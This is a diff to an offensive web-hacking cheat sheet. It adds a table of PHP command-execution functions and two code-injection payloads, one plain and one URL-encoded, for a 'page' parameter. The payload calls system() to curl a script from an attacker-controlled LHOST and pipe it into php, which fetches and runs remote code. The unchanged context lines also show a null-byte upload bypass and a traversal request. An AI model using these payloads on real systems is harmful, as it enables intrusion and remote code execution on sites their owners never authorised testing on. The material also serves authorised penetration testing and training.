@@ -2846,6 +2846,20 @@ GIF87a
 $ mv <FILE>.jpg <FILE>.php\x00.jpg
 ```
 
+### PHP Functions
+
+```c
++----------------+-----------------+----------------+----------------+
+|    Command     | Displays Output | Can Get Output | Gets Exit Code |
++----------------+-----------------+----------------+----------------+
+| system()       | Yes (as text)   | Last line only | Yes            |
+| passthru()     | Yes (raw)       | No             | Yes            |
+| exec()         | No              | Yes (array)    | Yes            |
+| shell_exec()   | No              | Yes (string)   | No             |
+| backticks (``) | No              | Yes (string)   | No             |
++----------------+-----------------+----------------+----------------+
+```
+
 ### phpinfo Dump
 
 ```c
@@ -3145,6 +3159,8 @@ $ curl http://<RHOST>/ftp/package.json.bak%2500.md
 
 ```c
 $ http://<RHOST>/PATH/TO/FILE/?page=http://<RHOST>/<FILE>.php
+$ http://<RHOST>/index.php?page=' and die(system("curl http://<LHOST>/<FILE>.php|php")) or '
+$ http://<RHOST>/index.php?page=%27%20and%20die(system(%22curl%20http://<LHOST>/<FILE>.php|php%22))%20or%20%27
 ```
 
 ### Root Cause Function
